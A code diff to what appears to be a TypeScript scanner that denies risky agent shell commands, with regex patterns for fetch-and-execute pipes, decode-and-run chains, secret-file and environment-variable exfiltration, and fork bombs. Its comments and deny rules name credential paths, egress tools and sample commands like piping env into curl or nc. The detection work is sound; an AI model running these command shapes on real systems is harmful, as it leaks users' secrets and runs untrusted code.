@@ -64,12 +64,16 @@ function decodeBase64Subst(s: string): string {
   );
 }
 
-/** Collect simple `name=value` assignments so `$name` references can be inlined. */
+/** Collect simple `name=value` assignments so `$name` references can be inlined.
+ *  Capped: a genuine concat-evasion uses a handful of variables, so stopping at
+ *  MAX_VARS keeps the fixed-point inline loop below from becoming O(vars × passes
+ *  × len) on a pathological blob of thousands of distinct assignments. */
+const MAX_VARS = 48;
 function collectAssignments(s: string): Map<string, string> {
   const vars = new Map<string, string>();
   const re = /(?:^|[;|&]|\bthen\b|\bdo\b)\s*([A-Za-z_][A-Za-z0-9_]*)=("[^"]*"|'[^']*'|[^\s;|&]*)/g;
   let m: RegExpExecArray | null;
-  while ((m = re.exec(s))) vars.set(m[1], m[2].replace(/^['"]|['"]$/g, ""));
+  while ((m = re.exec(s)) && vars.size < MAX_VARS) vars.set(m[1], m[2].replace(/^['"]|['"]$/g, ""));
   return vars;
 }
 
@@ -115,20 +119,57 @@ export function resolveCommand(cmd: string): string {
 
 const SHELL = /\b(?:ba|z|da)?sh\b/;
 const FETCH = /\b(?:curl|wget|fetch)\b/;
-/** Sensitive files an injected agent might read and leak. */
+/** Sensitive files an injected agent might read and leak. The `.env` alternative
+ *  is anchored so it matches a `.env` FILE (`cat .env`, `@$HOME/.env`) but NOT a
+ *  `process.env` / `.environ` env-var READ — those are handled by SECRET_ENVNAME. */
 const SECRET_PATH =
-  /\.ssh\b|id_rsa\b|id_ed25519\b|id_ecdsa\b|id_dsa\b|\.aws\b|\.gnupg\b|\.config\/gh\b|\.config\/gcloud\b|\.config\/rclone\b|\.config\/git\/credentials|rclone\.conf\b|\.azure\b|\.terraform\.d\b|\.npmrc\b|\.netrc\b|\.pgpass\b|\.kube\/config|kubeconfig\b|credentials\.json|\.git-credentials|\/etc\/shadow|\/proc\/self\/environ|\.docker\/config\.json|\.bash_history\b|\.zsh_history\b|\.env\b/i;
+  /\.ssh\b|id_rsa\b|id_ed25519\b|id_ecdsa\b|id_dsa\b|\.aws\b|\.gnupg\b|\.config\/gh\b|\.config\/gcloud\b|\.config\/rclone\b|\.config\/git\/credentials|rclone\.conf\b|\.azure\b|\.terraform\.d\b|\.npmrc\b|\.netrc\b|\.pgpass\b|\.kube\/config|kubeconfig\b|credentials\.json|\.git-credentials|\/etc\/shadow|\/proc\/self\/environ|\.docker\/config\.json|\.bash_history\b|\.zsh_history\b|(?<![A-Za-z0-9_.])\.env\b/i;
 /** Bare secret-bearing env-var names (read via $VAR, ENVIRON["…"], process.env.…). */
 const SECRET_ENVNAME = /\b(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|GITHUB_TOKEN|GH_TOKEN|NPM_TOKEN|ANTHROPIC_API_KEY|OPENAI_API_KEY|STRIPE_SECRET_KEY|DB_PASSWORD|DATABASE_URL|SESSION_COOKIE)\b/;
 /** Channels that move bytes off the machine (HTTP, DNS, ICMP, raw socket, mail,
- *  cloud-storage CLIs, and the gawk /inet networking extension). */
-const HTTP_EGRESS = /\b(?:curl|wget)\b|\bn(?:c|cat)\b|\bsocat\b|\b(?:dig|nslookup|host|getent)\b|\bping\b|\btelnet\b|\/dev\/(?:tcp|udp)\/|\/inet\/(?:tcp|udp)\/|\burlopen\b|\brequests\.(?:get|post)\b|\bfetch\s*\(|\bNet::HTTP\b|\bLWP\b|\bfile_get_contents\b|\b(?:mail|mailx|mutt|sendmail|smtplib)\b|require\(['"]dns['"]\)|\bdns\.(?:resolve|lookup)|\brclone\b|\baws\b[^\n]{0,40}\bs3\b|\bgsutil\b|\baz\s+storage\b|\bgh\s+(?:api|gist)\b|\bkubectl\s+cp\b|\bb2\s+upload\b|\bmc\s+cp\b|\blogger\b[^\n]*(?:-n\b|--server|--tcp|--port|-P\b)|git\s+[^\n]*push\s+https?:\/\//i;
+ *  cloud-storage CLIs, and the gawk /inet networking extension). The DNS `host`
+ *  tool is matched only as a command invocation (`host example.com`, `host -t …`),
+ *  never the bare English word "host" / a `host:` field / a `host` variable. */
+const HTTP_EGRESS = /\b(?:curl|wget)\b|\bn(?:c|cat)\b|\bsocat\b|\b(?:dig|nslookup|getent)\b|\bhost\s+(?:-\w|\S*\.\w)|\bping\b|\btelnet\b|\/dev\/(?:tcp|udp)\/|\/inet\/(?:tcp|udp)\/|\burlopen\b|\brequests\.(?:get|post)\b|\bfetch\s*\(|\bNet::HTTP\b|\bLWP\b|\bfile_get_contents\b|\b(?:mail|mailx|mutt|sendmail|smtplib)\b|require\(['"](?:dns|https?)['"]\)|\bhttps?\.(?:get|request)\b|\bdns\.(?:resolve|lookup)|\brclone\b|\baws\b[^\n]{0,40}\bs3\b|\bgsutil\b|\baz\s+storage\b|\bgh\s+(?:api|gist)\b|\bkubectl\s+cp\b|\bb2\s+upload\b|\bmc\s+cp\b|\blogger\b[^\n]{0,200}(?:-n\b|--server|--tcp|--port|-P\b)|git\s+[^\n]{0,200}push\s+https?:\/\//i;
 const FILE_EGRESS = /\bscp\b|\bsftp\b|\bftp\b|\btftp\b|\brsync\b[^\n]*::/i;
 /** Secret-shaped environment variable names. */
 const SECRET_VAR = /\$\{?[A-Z0-9_]*(?:AWS|GITHUB|GH_|OPENAI|ANTHROPIC|NPM|SECRET|TOKEN|API[_-]?KEY|APIKEY|PASSWORD|PRIVATE|ACCESS_KEY|DATABASE_URL|DB_URL|SESSION|COOKIE|CONN(?:ECTION)?_?STR|DSN)[A-Z0-9_]*\}?/;
 
+/** Any decode/transform tool whose output, piped into a shell, means run-the-blob.
+ *  `\b` anchors on `gunzip`/`zcat`/… so a stage HEAD check matches the tool, not a
+ *  substring. Kept as a source string so it composes into a stage-head RegExp. */
+const TRANSFORM =
+  "base64\\s+-{1,2}(?:d|decode|D)|xxd\\s+-r|base32\\s+-{1,2}d|openssl\\s+enc\\s+-d|\\buudecode\\b|\\bgunzip\\b|\\bzcat\\b|\\bgzip\\s+-d|\\brev\\b|\\btr\\s+['\"]?[A-Za-z]";
+
+/** Shell / interpreter as the HEAD of a pipeline stage (download piped INTO it). */
+const SHELL_OR_INTERP_HEAD = /^(?:sudo\s+)?(?:\S*\/)?(?:(?:ba|z|da)?sh|python\d?|perl|ruby|node|php)\b/i;
+const SHELL_HEAD = /^(?:sudo\s+)?(?:\S*\/)?(?:ba|z|da)?sh\b/i;
+const TRANSFORM_STAGE = new RegExp(TRANSFORM, "i");
+
+/** Split a command / segment into pipeline stages on `|`. resolveCommand has
+ *  already stripped quotes, so a plain split is adequate — and, unlike a nested
+ *  `(?:\|[^|]*)*\|` quantifier, it is LINEAR, so a long `|`-heavy or shell-free
+ *  input can no longer trigger catastrophic backtracking. */
+function pipelineStages(s: string): string[] {
+  return s.split(/\|+/).map((x) => x.trim()).filter(Boolean);
+}
+
+/** True when some stage matches `headRe` (the source, e.g. a fetch or a decode)
+ *  and a LATER stage's HEAD matches `execRe` (a shell/interpreter the output flows
+ *  into) — i.e. the pipeline feeds its output into execution, possibly through
+ *  intervening transform stages (curl … | base64 -d | sh) and regardless of
+ *  anything piped after the shell. */
+function pipesInto(stages: string[], execRe: RegExp, headRe: RegExp): boolean {
+  const srcIdx = stages.findIndex((st) => headRe.test(st));
+  if (srcIdx < 0 || srcIdx >= stages.length - 1) return false;
+  return stages.slice(srcIdx + 1).some((st) => execRe.test(st));
+}
+
 function detectFetchExec(s: string): Cap | null {
-  if (new RegExp(FETCH.source + "[^|\\n]*\\|\\s*(?:sudo\\s+)?(?:\\S*\\/)?(?:(?:ba|z|da)?sh|python\\d?|perl|ruby|node|php)\\b", "i").test(s))
+  const stages = pipelineStages(s);
+  // A network download whose output is the final interpreter stage (curl … | sh,
+  // wget … | python). Stage-split, so a `|`-heavy shell-free line stays linear.
+  if (pipesInto(stages, SHELL_OR_INTERP_HEAD, FETCH))
     return { id: "fetch-exec-pipe", decision: "deny", label: "pipes a network download straight into a shell/interpreter" };
   // base64-decode to an executable file then mark it runnable (staged dropper).
   if (/\bbase64\s+(?:-d|--decode|-D)\b[^\n]*>\s*\S+[^\n]*\bchmod\s+\+?x/i.test(s))
@@ -137,9 +178,9 @@ function detectFetchExec(s: string): Cap | null {
     return { id: "fetch-exec-subst", decision: "deny", label: "executes the output of a network fetch" };
   // Decode/transform-and-execute: any decode/transform tool (base64, hex, base32,
   // gunzip, ROT13 via tr, rev, openssl) whose output is piped into a shell —
-  // possibly through a chain of transforms (… | base64 -d | gunzip | sh).
-  const TRANSFORM = "base64\\s+-{1,2}(?:d|decode|D)|xxd\\s+-r|base32\\s+-{1,2}d|openssl\\s+enc\\s+-d|uudecode|gunzip|zcat|gzip\\s+-d|\\brev\\b|\\btr\\s+['\"]?[A-Za-z]";
-  if (new RegExp("(?:" + TRANSFORM + ")[^\\n]*(?:\\|\\s*[^|\\n]*)*\\|\\s*(?:sudo\\s+)?(?:\\S*\\/)?(?:ba|z|da)?sh\\b", "i").test(s))
+  // possibly through a chain of transforms (… | base64 -d | gunzip | sh). Tested
+  // stage-by-stage instead of with a nested-quantifier regex.
+  if (pipesInto(stages, SHELL_HEAD, TRANSFORM_STAGE))
     return { id: "fetch-exec-subst", decision: "deny", label: "decodes/deobfuscates a blob and runs it in a shell" };
   // eval/sh -c of a transform substitution: eval "$(tr … <<< …)", bash -c "$(rev <<< …)".
   if (/\b(?:eval|(?:ba|z)?sh\s+-c)\b[^\n]*\$\([^)]*(?:\brev\b|\btr\s+['"]?[A-Za-z]|base64\s+-d|gunzip|xxd\s+-r)/i.test(s))
@@ -194,17 +235,36 @@ function detectReverseShell(s: string): Cap | null {
   return null;
 }
 
+/** A secret FILE path embedded directly inside an http(s) URL — fetching that URL
+ *  (a markdown image, a badge, a beacon) ships the file path/contents off-box.
+ *  The token is contiguous with the URL (no space/quote), so benign prose that
+ *  merely links somewhere and mentions `.ssh` elsewhere does not match. */
+const SECRET_PATH_IN_URL =
+  /https?:\/\/[^\s)'"]*(?:id_rsa|id_ed25519|id_ecdsa|id_dsa|\/\.ssh(?:\/|\b)|~\/\.ssh|\.aws\/credentials|\.aws(?:\/|%2F)|\.npmrc\b|\.netrc\b|\.pgpass\b|\.git-credentials|\.kube\/config|credentials\.json|\/etc\/shadow)/i;
+/** A known secret env value concatenated onto a fetched URL string literal
+ *  (`fetch('https://x/r?id='+process.env.NPM_TOKEN)`) — the request carries the
+ *  secret in its URL. Anchored on `"<http url>" +` so a header-based auth client
+ *  (`'Bearer '+process.env.TOKEN`) does not match (the thing before `+` is not a URL). */
+const SECRET_VALUE_IN_URL =
+  /['"]https?:\/\/[^'"\n]{0,300}['"]\s*\+\s*(?:process\.env\.\w*(?:TOKEN|SECRET|KEY|PASSWORD|NPM|AWS|GITHUB|ANTHROPIC|OPENAI|STRIPE|SESSION|COOKIE|DSN)\w*|os\.environ\s*[.[]\s*['"]?\w*(?:TOKEN|SECRET|KEY|PASSWORD|NPM|AWS|GITHUB)|\$\{?[A-Z0-9_]*(?:TOKEN|SECRET|KEY|PASSWORD|API[_-]?KEY)[A-Z0-9_]*\}?)/i;
+
 function detectSecretExfil(s: string): Cap | null {
   if (SECRET_PATH.test(s)) {
     if (HTTP_EGRESS.test(s)) return { id: "exfil-secret-net", decision: "deny", label: "reads a secret file and sends it off the machine" };
-    if (FILE_EGRESS.test(s) && /\b\w+@?[\w.-]+:/.test(s)) return { id: "exfil-secret-copy", decision: "deny", label: "copies a secret file to a remote host" };
+    if (FILE_EGRESS.test(s) && /(?:^|\s)[\w.-]+@?[\w.-]*:/.test(s)) return { id: "exfil-secret-copy", decision: "deny", label: "copies a secret file to a remote host" };
     // Copying a secret into a publicly-served directory (download it over HTTP later).
     if (/\/var\/www|\/srv\/www|\/usr\/share\/nginx|\/public\/|\bpublic\/|\/static\/|\.\/public\b/i.test(s) && /\bopen\s*\(|>\s|>>\s|\bwrite\b|\bcp\b|\bmv\b|\btee\b/i.test(s))
       return { id: "exfil-secret-public", decision: "deny", label: "copies a secret file into a publicly-served location" };
   }
+  // A secret file path carried inside a fetched URL (markdown image / beacon).
+  if (SECRET_PATH_IN_URL.test(s))
+    return { id: "exfil-secret-net", decision: "deny", label: "reads a secret file and sends it off the machine" };
   // Bare secret env-var NAME (ENVIRON["AWS_SECRET…"], $GITHUB_TOKEN) shipped as POST data.
   if (SECRET_ENVNAME.test(s) && /\b(?:curl|wget)\b[^\n]*(?:-d\b|--data\S*|-F\b|--form|-T\b|--upload|-G\b)|\|\s*(?:curl|wget|n(?:c|cat)|logger)\b/i.test(s))
     return { id: "exfil-secret-var", decision: "deny", label: "exfiltrates a named secret environment variable" };
+  // A secret env value concatenated onto a fetched URL (fetch('…?t='+process.env.X)).
+  if (SECRET_VALUE_IN_URL.test(s))
+    return { id: "exfil-secret-var", decision: "deny", label: "sends a secret-looking value to a URL or DNS lookup" };
   // Secret-named variable posted to the network (after assignment inlining) —
   // either as POST data or carried inside the request URL.
   if (SECRET_VAR.test(s) && (
@@ -215,13 +275,36 @@ function detectSecretExfil(s: string): Cap | null {
   return null;
 }
 
+/** An egress tool as the HEAD of a pipeline stage — it ships whatever is piped
+ *  into it off the machine. Anchored at stage start so `env | grep NODE` (grep is
+ *  not egress; `NODE` is just an argument) does NOT count, while `env | curl …`,
+ *  `env | nc …`, `printenv | perl …` do. */
+const EGRESS_OR_INTERP_HEAD =
+  /^(?:sudo\s+)?(?:\S*\/)?(?:curl|wget|nc|ncat|socat|telnet|mail|mailx|mutt|sendmail|logger|rclone|gsutil|b2|mc|gh|kubectl|aws|az|dig|nslookup|host|python\d?|perl|ruby|node|php)\b/i;
 function detectEnvExfil(s: string): Cap | null {
-  // `env` only counts as a dump when it pipes its output (not `env VAR=x cmd`).
-  const envDump = /\bprintenv\b/i.test(s) || /\benv\s*\|/i.test(s) || /\benv\s*>/i.test(s) || /\bexport\s+-p\b/i.test(s);
-  if (envDump && (HTTP_EGRESS.test(s) || /\b(?:python\d?|perl|ruby|node|php)\b/i.test(s)))
-    return { id: "exfil-env", decision: "deny", label: "ships environment variables (secrets) off the machine" };
-  // Dump-to-file then upload (printenv > f && curl -F @f) — not a pipe, same intent.
-  if (envDump && /\b(?:curl|wget|n(?:c|cat)|socat)\b[^\n]*(?:-F\b|--data\S*|--upload|-T\b|@\/|@-|@\$)/i.test(s))
+  // A dump of the environment (`env |`, `printenv |`, `export -p |`) whose output
+  // is piped onward — then the egress/interpreter must be the HEAD of one of the
+  // LATER pipeline stages, not merely a token somewhere. That is what separates
+  // `env | grep NODE` / `printenv | sort` (allowed — the second stage is grep/sort,
+  // and NODE is just an argument) from `env | curl -d @- x`, `printenv | nc h 9`,
+  // and `['sh','-c','env | curl …']` (still denied). `[^\n|=]*` before the pipe
+  // keeps `env VAR=x | …` (a variable assignment, not a dump) out.
+  const m = /\b(?:printenv|env|export\s+-p)\b[^\n|=]*\|/i.exec(s);
+  if (m) {
+    const rest = s.slice(m.index + m[0].length);
+    // The output is shipped out when a later pipeline stage is headed by an
+    // egress tool / interpreter (`env | curl …`, `env | node …`), or when the
+    // downstream carries an egress tool at all (`env | base64 | while …; dig …`).
+    // A plain `env | grep NODE` / `printenv | sort` matches neither (`grep`/`sort`
+    // are not egress and `NODE`/`sort` are not egress tokens).
+    if (pipelineStages(rest).some((st) => EGRESS_OR_INTERP_HEAD.test(st)) || HTTP_EGRESS.test(rest))
+      return { id: "exfil-env", decision: "deny", label: "ships environment variables (secrets) off the machine" };
+  }
+  // Dump-to-file then ship out (printenv > f … curl -F @f / rclone … < f) — not a
+  // pipe, same intent. The redirect is a strong dump signal, so any egress channel
+  // in the (window-bounded) neighbourhood counts.
+  const envDumpRedir = /\bprintenv\b[^\n|]*>|\benv\s*>|\bexport\s+-p\b[^\n|]*>/i.test(s);
+  if (envDumpRedir && HTTP_EGRESS.test(s))
     return { id: "exfil-env", decision: "deny", label: "dumps environment variables to a file and uploads it" };
   return null;
 }
@@ -248,7 +331,9 @@ function detectDestructive(s: string): Cap | null {
 function detectForkBomb(s: string): Cap | null {
   if (/:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/.test(s)) return { id: "forkbomb-classic", decision: "deny", label: "is a fork bomb" };
   // Renamed fork bomb: a function whose body recurses into itself across a pipe and backgrounds.
-  const m = /([A-Za-z_]\w*)\s*\(\)\s*\{([^}]*)\}/.exec(s);
+  // Name/body lengths are bounded so a long alphanumeric run can't backtrack the
+  // `\w*` capture quadratically (a real function name/body is short).
+  const m = /([A-Za-z_]\w{0,40})\s*\(\)\s*\{([^}]{0,600})\}/.exec(s);
   if (m) {
     const name = m[1], body = m[2];
     const calls = (body.match(new RegExp("\\b" + name + "\\b", "g")) ?? []).length;
@@ -319,14 +404,41 @@ function detectFetchToPersist(s: string): Cap | null {
  *  file is persistence/RCE regardless of the file's path. Scans both the raw
  *  content and its resolved form so neither quote-stripping nor obfuscation hides
  *  the behaviour. */
+const CONTENT_DETECTORS = [detectFetchExec, detectReverseShell, detectEnvExfil, detectSecretExfil, detectContentExfil, detectFetchToPersist, detectConfigRepoint, detectToolingHijack];
+
+/** Overlapping proximity windows over file CONTENT. A whole file is NOT scanned
+ *  as one blob: a capability must come from a bounded span, so a file that merely
+ *  mentions `.env` on one line and `fetch(` 400 lines later is not a "secret +
+ *  egress" exfil. The 50% stride keeps any span ≤ STRIDE chars whole in at least
+ *  one window; it also bounds every regex's input, which is what makes the
+ *  scan linear (and kills the whole-file-as-one-line backtracking blowups). */
+const CONTENT_WINDOW = 512;
+const CONTENT_STRIDE = 256;
+function contentWindows(content: string): string[] {
+  if (content.length <= CONTENT_WINDOW) return [content];
+  const windows: string[] = [];
+  for (let i = 0; i < content.length; i += CONTENT_STRIDE) {
+    windows.push(content.slice(i, i + CONTENT_WINDOW));
+    if (i + CONTENT_WINDOW >= content.length) break;
+  }
+  return windows;
+}
+
 export function detectContentCapabilities(content: string): Cap[] {
-  const resolved = resolveCommand(content);
   const seen = new Set<string>();
   const caps: Cap[] = [];
-  for (const text of [content, resolved]) {
-    for (const d of [detectFetchExec, detectReverseShell, detectEnvExfil, detectSecretExfil, detectContentExfil, detectFetchToPersist, detectConfigRepoint, detectToolingHijack]) {
-      const c = d(text);
-      if (c && !seen.has(c.id)) { seen.add(c.id); caps.push(c); }
+  // Scan each window in both its raw form (newlines preserved — line-local
+  // matching) and its resolved form (shell obfuscation undone within the window),
+  // so neither quote-stripping nor layout hides behaviour, yet co-occurrence is
+  // always bounded to the window.
+  for (const window of contentWindows(content)) {
+    const resolved = resolveCommand(window);
+    const forms = resolved === window ? [window] : [window, resolved];
+    for (const text of forms) {
+      for (const d of CONTENT_DETECTORS) {
+        const c = d(text);
+        if (c && !seen.has(c.id)) { seen.add(c.id); caps.push(c); }
+      }
     }
   }
   return caps;
